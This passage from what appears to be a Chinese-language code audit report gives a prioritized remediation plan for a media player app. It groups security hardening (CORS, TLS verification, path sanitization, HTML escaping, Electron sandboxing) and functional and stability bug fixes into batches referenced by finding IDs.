1. H-1/H-5:go-proxy 与 `/cache` `/proxy` 去掉 `ACAO:*`、加鉴权/来源校验、Cookie 仅对网盘域名白名单附加 —— 一个 PR 可完成,消除"恶意网页即可攻击"的最大面
2. H-2:`verify=False` 全量改 `verify=True`(48 处机械替换)
3. H-4:config `key` 路径清洗 + `app.py` basename 清洗
4. H-6:escHtml 补单引号转义 + 两处 onerror 改 data-fb 模式
5. M-1/M-2:settings-set 白名单 + addHls 协议校验(渲染层被攻破后的落地面)
6. M-4/M-5:窗口 `contextIsolation`/`sandbox` 配置(一行改动)

**第二批(用户可感知的功能 bug)**

7. H-7:player.js `header` ReferenceError(parse=1 全挂,一行修复)
8. H-8:go-proxy 无长度分支响应头 + `bytes=0-0`(HLS 播放)
9. H-9 + M-1 同构:python-bridge/downloader exit 回调守卫(孤儿进程)
10. M-9:边下边播扩展名点号
11. M-15/M-16:SpiderRunner `"destroy"` 子串与控制字符转义
12. M-18:`dict(parse_qsl(...))`(Kazumi 剧集消失)
13. M-29/M-30:detail.js `data` 作用域 + 四处异步竞态令牌化

**第三批(稳定性与数据完整性)**

14. M-12/M-13/M-14/M-17/M-27:jar 桥系列(锁、缓存寻址、-jvm.jar 失效、共享 JVM 销毁、重启计数)
15. M-19/M-20/M-21/M-22/M-23/M-28:Kazumi 规则加载容错、SSE done、_SegStream 泄漏、cache key 编码、空插件保护、Cookie 原子写
16. H-3/M-24:QuickJS 限额与 KV 隔离
17. 其余低危按表批量处理(L-1 ~ L-33)

---

*本报告由四路并行静态审查生成,高危项与代表性中危项均已在源码中逐行人工资复核;如对某条结论有疑问,可按 file:line 定位原始代码核对。*
